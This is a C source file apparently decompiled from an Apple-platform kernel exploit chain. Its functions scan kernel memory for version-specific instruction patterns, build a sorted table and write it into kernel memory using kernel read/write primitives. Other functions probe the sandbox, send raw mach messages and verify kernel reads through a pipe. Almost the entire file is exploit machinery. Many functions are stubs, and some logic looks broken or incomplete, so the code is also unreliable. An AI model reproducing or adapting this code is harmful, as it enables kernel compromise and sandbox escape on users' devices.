/*
 * record_0x90000_kobj_scan.c
 * sub_229f0..sub_2667c — kobj scanner, sorted-table helpers, sandbox probes,
 *                        spinlock, mach_msg send, kread/pipe verify
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <IOKit/IOKitLib.h>
#include <sandbox.h>

/* sandbox_check not in public SDK headers — declare manually */
extern int sandbox_check(pid_t pid, const char *operation, int type, ...);
#define SANDBOX_CHECK_NO_REPORT 2

/* ── cross-file externs ──────────────────────────────────────────────────── */
extern int   sub_37238(long state, uint32_t flag);
extern long  sub_33638(long state, io_connect_t conn);
extern long  sub_1ad70(long state, uint64_t addr);
extern int   sub_29ab4(long state, uint64_t addr, void *out);
extern int   sub_2a90c(long state, uint64_t addr, uint32_t *out);
extern int   sub_2a110(long state, uint64_t addr, uint64_t val);
extern int   sub_2b614(long state, uint64_t addr, void *buf, uint32_t sz);
extern int   sub_2b860(long state, uint64_t addr, uint32_t sz, void *out, long ctx);
extern void  sub_216b4(long ctx, void *buf, size_t sz);
extern void  sub_21730(int *fd, void *buf, size_t sz);
extern void  sub_1b50c(void *ctx, ...);
extern void  sub_1b410(void *ctx, long state, const char *seg, const char *sect);
extern long  sub_1b31c(long state, uint64_t addr);
extern long  sub_1f784(void *ctx, const char *pat, int a, int b);
extern long  sub_2057c(long state, uint64_t addr);
extern long  sub_3b194(void *ctx, long state);
extern long  sub_1b624(void *ctx, long state);
extern long  sub_1ad30(void *fn);

/* stubs for symbols that live in other translation units */
extern void  sub_3376c_stub(uint64_t addr);
extern void  sub_2295c_stub(long state, void *ctx);

/* forward declarations */
static int sub_235cc(const void *a, const void *b);

/* ── sub_229f0 — kobj scanner / context builder ─────────────────────────── */
void sub_229f0(long param_1, void **param_2)
{
    void *obj = calloc(0x20, 1);
    if (!obj) return;

    void *pvVar11 = *(void **)(param_1 + 0x1998);
    if (!pvVar11 && *(long *)(param_1 + 0x19f8)) {
        uint64_t kaddr = *(uint64_t *)(param_1 + 0x158);
        if (kaddr >> 0x2b < 1099) {
            void *ctx[3] = {0};
            sub_3b194(ctx, param_1);
            const char *pat = (kaddr < 0x1f541e00000000ULL)
                ? "0A 05 40 F9 2B 11 40 39"
                : "0B 05 40 F9 6C 11 40 39";
            long hit = sub_1f784(ctx, pat, 0, 1);
            if (hit) {
                long kext = *(long *)(param_1 + 0x19f8);
                long target = 0;
                if (kaddr > 0x1c1b0002dfffff) {
                    long lo = hit - 0x40, hi = hit - 4, cur = hit;
                    while (lo <= hi) {
                        cur -= 4;
                        uint32_t i1 = (uint32_t)sub_1b31c(kext, (uint64_t)cur);
                        if ((i1 & 0x9f000000) == 0x90000000) {
                            uint32_t i2 = (uint32_t)sub_1b31c(kext, (uint64_t)(cur + 4));
                            if ((i2 & 0xbfc00000) == 0xb9400000) {
                                target = sub_2057c(kext, (uint64_t)cur); break;
                            }
                        } else if (i1 == 0xd503201f) {
                            uint32_t i2 = (uint32_t)sub_1b31c(kext, (uint64_t)(cur + 4));
                            if (((uint64_t)i2 >> 0x18 & 0xff) == 0x58) {
                                target = sub_2057c(kext, (uint64_t)cur); break;
                            }
                        }
                        hi = cur - 4;
                    }
                } else {
                    long off = (kaddr < 0x18091980200000ULL) ? -0x10 : -0x1c;
                    target = sub_2057c(kext, (uint64_t)(hit + off));
                }
                if (target) { *(long *)(param_1 + 0x1998) = target; pvVar11 = (void *)target; }
            }
        } else {
            void *ctx2[3] = {0};
            sub_1b50c(ctx2, param_1);
            if (!sub_37238(param_1, 0x20)) {
                int xnu = *(int *)(param_1 + 0x140);
                const char *pat2 = (xnu < 0x225c)
                    ? "3F 7D 01 A9 .. .. .. .. 5F 01 00 F9"
                    : (xnu < 0x2712)
                    ? "00 E4 00 .. 20 01 00 AD .. .. .. .. 5F 01 00 F9"
                    : "E0 03 13 AA 01 00 80 52 02 05 80 52 .. .. .. .. E0 03";
                long hit2 = sub_1f784(ctx2, pat2, 0, 1);
                if (hit2) {
                    long kext2 = *(long *)(param_1 + 0x19f8);
                    long off2 = (xnu < 0x2712) ? -0xc : -0x14;
                    long t2 = sub_2057c(kext2, (uint64_t)(hit2 + off2));
                    if (t2) {
                        if (xnu >= 0x2712)
                            t2 = sub_1b31c(kext2, (uint64_t)(t2 + *(int *)(param_1 + 0x168)));
                        pvVar11 = (void *)t2;
                        *(long *)(param_1 + 0x1998) = t2;
                    }
                }
            } else {
                void *pvVar18b = *(void **)(param_1 + 0x1d38);
                if (!pvVar18b) {
                    uint64_t base = *(uint64_t *)(*(long *)(param_1 + 0x118) + 0x148);
                    if (base) {
                        base &= ~*(uint64_t *)(param_1 + 0x188);
                        uint32_t type = 0;
                        while (sub_2a90c(param_1, base, &type) && type != (uint32_t)-0x1120531)
                            base -= *(uint32_t *)(param_1 + 0x180);
                        if (base) {
                            void *ctx3 = calloc(0x128, 1);
                            if (ctx3) { sub_1b624(ctx3, param_1); pvVar18b = ctx3; *(void **)(param_1 + 0x1d38) = ctx3; }
                        }
                    }
                }
                pvVar11 = pvVar18b;
            }
        }
    }

    if (pvVar11) { ((void **)obj)[0] = pvVar11; *param_2 = obj; }
    else free(obj);
}

/* ── sub_231f4 — search sorted table ────────────────────────────────────── */
void sub_231f4(long param_1, long param_2, void *param_3, uint32_t param_4)
{
    if (!param_2 || !*(long *)(param_2 + 0x18) ||
        !*(uint32_t *)(param_2 + 0x10) || *(uint32_t *)(param_2 + 8) != param_4) return;
    long base = *(long *)(param_2 + 0x18);
    uint32_t n = *(uint32_t *)(param_2 + 0x10);
    int stride = *(int *)(param_2 + 0xc);
    size_t off = 0;
    do { n--; if (!memcmp((void *)(base + off), param_3, param_4)) return; off += (size_t)(stride + param_4); } while (n);
}

/* ── sub_232b0 — insert into sorted table ───────────────────────────────── */
void sub_232b0(long param_1, long param_2, void *param_3, uint64_t param_4)
{
    if (!param_2 || !*(long *)(param_2 + 0x18) || *(int *)(param_2 + 8) != (int)param_4) return;
    sub_231f4(param_1, param_2, param_3, (uint32_t)param_4);
    uint32_t cnt = *(uint32_t *)(param_2 + 0x10);
    if (cnt >= 0x400) return;
    long base  = *(long *)(param_2 + 0x18);
    int stride = *(int *)(param_2 + 0xc);
    void *dst  = (void *)(base + (long)(stride + (int)param_4) * cnt);
    memcpy(dst, param_3, param_4 & 0xffffffff);
    *(uint32_t *)(param_2 + 0x10) = cnt + 1;
    if (stride == 2) { *(uint8_t *)((char *)dst + param_4) = 2; *(uint8_t *)((char *)dst + param_4 + 1) = 0; }
    if (*(void **)(param_2 + 0x18) && *(uint32_t *)(param_2 + 0x10)) {
        typedef int (*cmp_t)(const void *, const void *);
        cmp_t fn = (cmp_t)(uintptr_t)sub_1ad30((void *)sub_235cc);
        qsort(*(void **)(param_2 + 0x18), *(uint32_t *)(param_2 + 0x10),
              (size_t)(uint32_t)(stride + *(int *)(param_2 + 8)), fn);
    }
}

/* ── sub_233d8 — kwrite table to kernel ─────────────────────────────────── */
void sub_233d8(long param_1, long *param_2)
{
    if (!param_2 || !param_2[3] || !*param_2) return;
    uint64_t kaddr = *(uint64_t *)(param_1 + 0x158);
    long off = (kaddr >> 0x2b < 1099) ? 0x30 : 0x40;
    int ok = sub_2b614(param_1, (uint64_t)(off + *param_2), (void *)param_2[3],
                       (uint32_t)((*(int *)((char *)param_2 + 0xc) + (int)param_2[1]) * (int)param_2[2]));
    if (ok) {
        long off2 = (kaddr >> 0x2b < 1099) ? 0x2c : 0x3c;
        sub_2a110(param_1, (uint64_t)(*param_2 + off2), (int)param_2[2]);
    }
}

/* ── sub_234ac — lookup + insert ────────────────────────────────────────── */
void sub_234ac(long param_1, uint32_t param_2, int param_3, long param_4)
{
    if (param_3 != 0x14) return;
    void *ctx = NULL;
    sub_229f0(param_1, &ctx);
    if (!ctx) return;
    for (uint32_t i = 0; i < param_2; i++)
        sub_232b0(param_1, (long)ctx, (void *)(param_4 + (i & ~3u)), 0x14);
    sub_233d8(param_1, (long *)ctx);
    sub_2295c_stub(param_1, ctx);
}

/* ── sub_2358c — thin wrapper ────────────────────────────────────────────── */
void sub_2358c(long param_1, uint64_t param_2, int param_3)
{
    sub_234ac(param_1, 1, param_3, (long)param_2);
}

/* ── sub_235cc — byte comparator ────────────────────────────────────────── */
static int sub_235cc(const void *a, const void *b)
{
    const uint8_t *pa = a, *pb = b;
    for (int i = 0; i < 0x14; i++) {
        if (pa[i] < pb[i]) return -1;
        if (pb[i] < pa[i]) return  1;
    }
    return 0;
}

/* ── sub_23674 / sub_236b0 / sub_236ec ───────────────────────────────────── */
void sub_23674(long param_1) { sub_3376c_stub(*(uint64_t *)(param_1 + 0x20)); }
void sub_236b0(long param_1) { sub_33638(*(long *)(param_1 + 0x20), 0); }
void sub_236ec(void) {}

/* ── sub_24bdc — sandbox probe ───────────────────────────────────────────── */
void sub_24bdc(int param_1)
{
    pid_t pid = getpid();
    if (sandbox_check(pid, NULL, 0) == 0) return;
    if (sandbox_check(pid, "mach-lookup", SANDBOX_CHECK_NO_REPORT | 2) == 0) {
        if (sandbox_check(pid, "mach-lookup", SANDBOX_CHECK_NO_REPORT | 2) != 0 && param_1) {
            if (sandbox_check(pid, "syscall-unix", SANDBOX_CHECK_NO_REPORT) != 1) {
                int s = socket(AF_INET, SOCK_DGRAM, 0);
                if (s != -1) close(s);
            }
        }
    }
}

/* ── sub_24cec — sandbox flag store ─────────────────────────────────────── */
void sub_24cec(long param_1)
{
    pid_t pid = getpid();
    int r = sandbox_check(pid, NULL, 0);
    if (r == 0 || r == 1) *(char *)(param_1 + 10) = (char)r;
}

/* ── sub_2516c — string intern ───────────────────────────────────────────── */
void sub_2516c(long param_1, char *param_2, uint64_t *param_3)
{
    size_t len = strlen(param_2);
    extern void sub_251f0(long, char *, size_t, uint64_t *);
    uint64_t out = 0;
    sub_251f0(param_1, param_2, len + 1, &out);
    if (out) *param_3 = out;
}

/* ── sub_25abc — IOServiceMatching stub ─────────────────────────────────── */
void sub_25abc(void)
{
    CFMutableDictionaryRef d = IOServiceMatching(NULL);
    if (d) IOServiceGetMatchingService(kIOMainPortDefault, d);
}

/* ── sub_25850 — mach_msg send helper ───────────────────────────────────── */
void sub_25850(uint64_t *param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)
{
    if (!param_1 || !*param_1) return;
    uint32_t *hdr = (uint32_t *)*param_1;
    int has_reply = (int)param_1[2];
    hdr[0] = has_reply ? 0x80001514u : 0x1514u;
    hdr[1] = (uint32_t)param_1[1];
    hdr[2] = param_3; hdr[3] = param_2; hdr[4] = 0; hdr[5] = param_4; hdr[6] = (uint32_t)has_reply;
    mach_msg((mach_msg_header_t *)*param_1, MACH_SEND_MSG, hdr[1], 0, 0, 0, 0);
}

/* ── sub_25f7c — spinlock acquire ───────────────────────────────────────── */
void sub_25f7c(long param_1, uint32_t param_2)
{
    long base = *(long *)(param_1 + 0x118);
    if (!base || !*(long *)(param_1 + 0x120) || param_2 >= 0x40) return;
    uint64_t t0 = mach_absolute_time();
    volatile uint8_t *lock = (volatile uint8_t *)(base + param_2);
    while (__atomic_exchange_n(lock, 1, __ATOMIC_ACQUIRE)) {
        if (param_2) {
            uint64_t now = mach_absolute_time();
            uint32_t denom = *(uint32_t *)(param_1 + 0x260);
            uint64_t ms = denom ? ((now - t0) * *(uint32_t *)(param_1 + 0x25c)) / denom / 1000000 : 0;
            if (ms >= (uint64_t)param_2) return;
        }
        thread_switch(MACH_PORT_NULL, SWITCH_OPTION_DEPRESS, 1);
    }
}

/* ── sub_26004 — spinlock release ───────────────────────────────────────── */
void sub_26004(long param_1, uint32_t param_2, uint32_t param_3)
{
    long base = *(long *)(param_1 + 0x118);
    if (!base || !*(long *)(param_1 + 0x120)) return;
    volatile uint8_t *lock = (volatile uint8_t *)(base + param_2);
    __atomic_store_n(lock, 0, __ATOMIC_RELEASE);
    (void)param_3;
}

/* ── sub_26120 — close fd ────────────────────────────────────────────────── */
void sub_26120(int param_1) { close(param_1); }

/* ── sub_26180 — open /dev/null ──────────────────────────────────────────── */
void sub_26180(int *param_1)
{
    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) *param_1 = fd;
}

/* ── sub_2659c — kread + pipe round-trip verify ─────────────────────────── */
void sub_2659c(long param_1, long param_2, uint64_t param_3)
{
    uint8_t buf1[0x60], buf2[0x60];
    if (!sub_2b860(param_1, param_3, 0x60, buf1, 1)) return;
    sub_216b4(param_2, buf1, 0x60);
    sub_21730((int *)param_2, buf2, 0x60);
    (void)memcmp(buf1, buf2, 0x60);
}

/* ── sub_2667c — thin wrapper ────────────────────────────────────────────── */
void sub_2667c_kobj_scan(long param_1) { sub_2b860(param_1, 0, 0, NULL, 0); }
